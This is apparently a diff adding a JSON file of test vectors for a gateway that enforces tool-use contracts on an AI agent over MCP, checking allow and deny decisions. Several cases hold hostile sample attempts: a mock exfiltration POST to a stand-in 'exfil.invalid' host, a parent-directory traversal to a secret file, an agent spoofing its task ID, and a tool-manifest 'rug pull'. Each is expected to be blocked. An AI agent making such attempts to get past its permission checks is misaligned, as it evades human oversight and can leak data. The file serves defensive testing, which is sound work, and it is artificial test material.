@@ -1,0 +1,340 @@
+{
+  "schema_version": "2026-10-14.v2",
+  "description": "Canonical local release seed test vectors; these are not evaluation benchmark results. Test via REAL MCP fixture+gateway, verify upstream counters.",
+  "fixture_tool_server": "sandbox",
+  "fixture_tools": [
+    "repo.read_file",
+    "repo.list_files",
+    "repo.write_file",
+    "repo.delete_file",
+    "network.http_post"
+  ],
+  "contracts": {
+    "readonly": {
+      "task_id": "demo-repo-review",
+      "source": "trusted_config",
+      "allowed_tools": [
+        "repo.read_file",
+        "repo.list_files"
+      ],
+      "denied_actions": [
+        "write",
+        "delete",
+        "network_post"
+      ],
+      "resource_scopes": [
+        "sandbox-repo/**"
+      ],
+      "max_writes": 0
+    },
+    "docswrite": {
+      "task_id": "demo-docs-edit",
+      "source": "trusted_config",
+      "allowed_tools": [
+        "repo.read_file",
+        "repo.write_file"
+      ],
+      "resource_scopes": [
+        "sandbox-repo/docs/**"
+      ],
+      "max_writes": 2
+    },
+    "delete_review": {
+      "task_id": "demo-cleanup",
+      "source": "trusted_config",
+      "allowed_tools": [
+        "repo.delete_file"
+      ],
+      "resource_scopes": [
+        "sandbox-repo/tmp/**"
+      ],
+      "approval_rules": [
+        "repo.delete_file"
+      ]
+    }
+  },
+  "cases": [
+    {
+      "id": "AD-SEED-01",
+      "contract": "readonly",
+      "name": "legitimate read",
+      "attempt": {
+        "tool": "repo.read_file",
+        "args": {
+          "path": "sandbox-repo/README.md"
+        }
+      },
+      "expected": {
+        "decision": "ALLOW",
+        "upstream_call_delta": 1
+      }
+    },
+    {
+      "id": "AD-SEED-02",
+      "contract": "readonly",
+      "name": "read-only write denial",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/README.md",
+          "content": "harmless"
+        }
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0,
+        "file_hash_unchanged": true
+      }
+    },
+    {
+      "id": "AD-SEED-03",
+      "contract": "readonly",
+      "name": "mock exfil attempt blocked",
+      "attempt": {
+        "tool": "network.http_post",
+        "args": {
+          "url": "https://exfil.invalid/collect",
+          "body": "fake-only"
+        }
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0,
+        "sink_events_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-04",
+      "contract": "docswrite",
+      "name": "scoped doc write",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "demo update"
+        }
+      },
+      "expected": {
+        "decision": "ALLOW",
+        "upstream_call_delta": 1
+      }
+    },
+    {
+      "id": "AD-SEED-05",
+      "contract": "docswrite",
+      "name": "outside allowed directory",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/src/payment.py",
+          "content": "demo"
+        }
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0,
+        "file_hash_unchanged": true
+      }
+    },
+    {
+      "id": "AD-SEED-06",
+      "contract": "docswrite",
+      "name": "parent traversal",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/../../private/secret.txt",
+          "content": "demo"
+        }
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-07",
+      "contract": "delete_review",
+      "name": "delete goes to review",
+      "attempt": {
+        "tool": "repo.delete_file",
+        "args": {
+          "path": "sandbox-repo/tmp/demo.txt"
+        }
+      },
+      "setup": {
+        "review_action": "none",
+        "timeout_s": 1
+      },
+      "expected": {
+        "decision": "DENY",
+        "pending_review_observed": true,
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-08",
+      "contract": "delete_review",
+      "name": "approved one-time exact delete",
+      "attempt": {
+        "tool": "repo.delete_file",
+        "args": {
+          "path": "sandbox-repo/tmp/demo.txt"
+        }
+      },
+      "setup": {
+        "review_action": "approve_matching",
+        "approved_from": "trusted_admin_api"
+      },
+      "expected": {
+        "decision": "ALLOW",
+        "upstream_call_delta": 1,
+        "approval_consumed": true
+      }
+    },
+    {
+      "id": "AD-SEED-09",
+      "contract": "delete_review",
+      "name": "stale approval different args",
+      "attempt": {
+        "tool": "repo.delete_file",
+        "args": {
+          "path": "sandbox-repo/tmp/other.txt"
+        }
+      },
+      "setup": {
+        "review_action": "approve_different_args"
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-10",
+      "contract": "docswrite",
+      "name": "write budget reached",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "third"
+        }
+      },
+      "setup": {
+        "writes_already_reserved": 2
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-11",
+      "contract": "readonly",
+      "name": "agent attempts task spoof",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "hi",
+          "task_id": "demo-docs-edit"
+        }
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-12",
+      "contract": null,
+      "name": "missing trusted contract",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "demo"
+        }
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-13",
+      "contract": "readonly",
+      "name": "benign keyword text",
+      "attempt": {
+        "tool": "repo.read_file",
+        "args": {
+          "path": "sandbox-repo/issues/delete-bug.md"
+        }
+      },
+      "expected": {
+        "decision": "ALLOW",
+        "upstream_call_delta": 1
+      }
+    },
+    {
+      "id": "AD-SEED-14",
+      "contract": "docswrite",
+      "name": "tool schema rug pull",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "demo"
+        }
+      },
+      "setup": {
+        "manifest_changed_since_contract": true
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-15",
+      "contract": "docswrite",
+      "name": "expired binding",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "demo"
+        }
+      },
+      "setup": {
+        "contract_expired": true
+      },
+      "expected": {
+        "decision": "DENY",
+        "upstream_call_delta": 0
+      }
+    },
+    {
+      "id": "AD-SEED-16",
+      "contract": "docswrite",
+      "name": "concurrent budget reservation",
+      "attempt": {
+        "tool": "repo.write_file",
+        "args": {
+          "path": "sandbox-repo/docs/README.md",
+          "content": "race"
+        }
+      },
+      "setup": {
+        "writes_already_reserved": 1,
+        "simultaneous_identical_attempts": 2
+      },
+      "expected": {
+        "allowed_count": 1,
+        "denied_count": 1,
+        "upstream_call_delta": 1
+      }
+    }
+  ]
+}
